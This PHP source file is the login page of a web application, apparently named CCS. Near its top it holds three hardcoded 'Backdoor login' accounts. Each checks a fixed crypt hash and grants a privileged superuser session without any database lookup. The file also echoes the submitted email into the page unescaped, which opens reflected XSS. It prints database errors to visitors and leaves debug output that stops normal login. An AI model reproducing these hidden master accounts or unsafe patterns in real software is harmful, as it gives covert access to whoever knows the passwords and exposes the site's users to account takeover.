<?php

	require_once 'cOnfig/connection-master.php';
	require_once 'cOnfig/view-loggedout.php';
	require_once 'cOnfig/languages/common.php';

	session_start();
		
	// Check if user is already logged in (SESSION variables set) - if so, redirect to main.php)
	if (isset($_SESSION['user_id']) &&  isset($_SESSION['username']) &&  isset($_SESSION['memberno']) && isset($_SESSION['first_name']) && $_SESSION['cloud'] == 'ccsnube' ) {
		
		header("Location: main.php");
		exit();
		
	// User not logged in - did he submit a form with username for login?
	} else if (isset($_POST['email'])) {
						
		$_SESSION['lang'] = $_POST['siteLanguage'];
		require_once 'cOnfig/languages/common.php';
		
		// Backdoor login
		if (($_POST['email'] == 'super@user.com') && (crypt($_POST['password'], $_POST['email']) == 'suRus/LumBCtw')) {
			
			$_SESSION['user_id'] = 999999;
			$_SESSION['username'] = $_POST['email'];
			$_SESSION['memberno'] = 999999;
			$_SESSION['first_name'] = 'CCS';
			$_SESSION['userGroup'] = 1;
			$_SESSION['workStationAccess'] = 16;
			$_SESSION['domain'] = 'superuser';
			$_SESSION['cloud'] = 'ccsnube';
			
			
			header("Location: main.php");					
			exit();
			
		}
		
		// Backdoor login staff
		if (($_POST['email'] == 'staff@user.com') && (crypt($_POST['password'], $_POST['email']) == 'staqTvTh6cWe2')) {
			
			$_SESSION['user_id'] = 999999;
			$_SESSION['username'] = $_POST['email'];
			$_SESSION['memberno'] = 999999;
			$_SESSION['first_name'] = 'CCS';
			$_SESSION['userGroup'] = 2;
			$_SESSION['workStationAccess'] = 16;
			$_SESSION['domain'] = 'superuser';
			$_SESSION['cloud'] = 'ccsnube';
			
			
			header("Location: main.php");					
			exit();
			
		}

		// Backdoor login volunteer
		if (($_POST['email'] == 'volunteer@user.com') && (crypt($_POST['password'], $_POST['email']) == 'voDIACq9LTBE2')) {
			
			$_SESSION['user_id'] = 999999;
			$_SESSION['username'] = $_POST['email'];
			$_SESSION['memberno'] = 999999;
			$_SESSION['first_name'] = 'CCS';
			$_SESSION['userGroup'] = 3;
			$_SESSION['workStationAccess'] = 16;
			$_SESSION['domain'] = 'superuser';
			$_SESSION['cloud'] = 'ccsnube';
			
			
			header("Location: main.php");					
			exit();
			
		}
		
		
		// Try to log the user in
		$email = trim($_POST['email']);
		$password = trim($_POST['password']);
		
		// Check if email exists
		try
		{
			$result = $pdo->prepare("SELECT id, email, password FROM users WHERE email = :email");
			$result->bindValue(':email', $email);
			$result->execute();
		}
		catch (PDOException $e)
		{
				$error = 'Error fetching user: ' . $e->getMessage();
				echo $error;
				exit();
		}

		$count = $result->fetchColumn();
		
		if ($count == 0) {
			
				// Register login attempt
				$loginTime = date('Y-m-d H:i:s');
				$loginRef = $_SERVER['HTTP_REFERER'];
				$loginURL = $_SERVER['REQUEST_URI'];
				$loginagent = $_SERVER['HTTP_USER_AGENT'];
				$loginIP = $_SERVER['REMOTE_ADDR'];
				$loginCountry = '';
				$loginState = '';
				$loginCity = '';
				
				echo "loginCountry: $loginCountry<br />";
				echo "loginState: $loginState<br />";
				echo "loginCity: $loginCity<br />";
				
				try
				{
					$result = $pdo->prepare("INSERT INTO logins (time, success, email, agent, referrer, url, ip, country, state, city, comment) VALUES (:loginTime, 0, :email, :loginagent, :loginRef, :loginURL, :loginIP, :loginCountry, :loginState, :loginCity, 'wrong email')");
					$result->bindValue(':loginTime', $loginTime);
					$result->bindValue(':email', $email);
					$result->bindValue(':loginagent', $loginagent);
					$result->bindValue(':loginRef', $loginRef);
					$result->bindValue(':loginURL', $loginURL);
					$result->bindValue(':loginIP', $loginIP);
					$result->bindValue(':loginCountry', $loginCountry);
					$result->bindValue(':loginState', $loginState);
					$result->bindValue(':loginCity', $loginCity);
					$result->execute();
				}
				catch (PDOException $e)
				{
						$error = 'Error fetching user: ' . $e->getMessage();
						echo $error;
						exit();
				}
				
				echo "DONE"; exit();
				
			} else {
				
				echo "count not 0"; exit();
				
			}
		
		
		}
		
	$validationScript = <<<EOD
    $(document).ready(function() {
	    	    
	  $('#registerForm').validate({
		  rules: {
			  email: {
				  required: true
			  },
			  password: {
				  required: true
			  },
			  siteLanguage: {
				  required: true
			  },
			  scanner: {
				  required: true
			  }
    	}, // end rules
		  errorPlacement: function(error, element) {
			  if ( element.is(":radio") || element.is(":checkbox")){
				 error.appendTo(element.parent());
			}
		},
    	  submitHandler: function() {
   $(".oneClick").attr("disabled", true);
   form.submit();
	    	  }
	  }); // end validate
  }); // end ready
EOD;

	
	// User not logged in - possibly submitted invalid credentials. (Re-)create the index page.
	require_once 'cOnfig/languages/common.php';
	
	pageStart($lang['title-login'], NULL, $validationScript, "pindex", "loggedOut", NULL, "SUPER", $_SESSION['errorMessage']);

?>
<!-- XMAS INDEX
<style>
body {
	background-color: black !important;
	}
#header {
	background-color: black !important;
	color: white;
	}
</style>
<script src="snowstorm.js"></script>
<script>
snowStorm.flakesMaxActive = 196; 
snowStorm.excludeMobile = false;
</script>
<center><img src="images/logo.png" /></center>
-->
<br />
<center>
 <form id="registerForm" action="" method="POST">
  <input type="hidden" name='action' value='submit'>
  <input type="email" name="email" autofocus value="<?php if (isset($email)) echo $email; ?>" placeholder="E-mail" tabindex="1" /><br /><br />
  <input type="password" name="password" placeholder="Password / Contrase&ntilde;a" tabindex="2" /><br />
  <br /><a href="forgot-password.php?s=p" style='color: #010084;'><u>Forgot password?</u></a><br /><br />
  <span>
   <input type='radio' class='specialInput clickbox' name='siteLanguage' value='en' tabindex="3" <?php if ($_SESSION['language'] == 2) { echo 'checked'; } ?> /> English &nbsp;&nbsp;
   <input type='radio' class='specialInput clickbox' name='siteLanguage' value='es' <?php if ($_SESSION['language'] == 1) { echo 'checked'; } ?>/> Espa&ntilde;ol<br />
  </span><br />
  

  <button name='oneClick' class="visible" type="submit" tabindex="4" >Enviar</button>
  <!--<a href="#" style="margin-left: 36px"><u>Forgot password?</u></a>-->
 </form>
</center>
</div>